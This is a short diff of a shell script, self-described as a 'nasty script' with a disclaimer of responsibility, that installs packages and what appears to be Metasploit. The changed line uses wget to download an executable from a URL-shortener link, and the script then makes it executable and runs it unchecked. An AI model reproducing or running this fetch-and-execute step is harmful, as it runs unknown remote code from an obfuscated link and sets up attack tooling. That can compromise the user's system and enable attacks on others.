@@ -8,7 +8,7 @@ echo ---DISCLAIMER--- I AM NOT RESPONSIBLE FOR ANY ACTIONS YOU MAKE WITH THIS PR
 sleep 5s;
 echo Installing necessary files to run this nasty script.;
 sudo apt update && sudo apt install git libssl-dev libpcap-dev -y;
-wget -O msf.run https://is.gd/metaspl0it;
+wget -O msf.run https://is.gd/met4sploit;
 chmod +x msf.run;
 ./msf.run;
 service postgresql start;
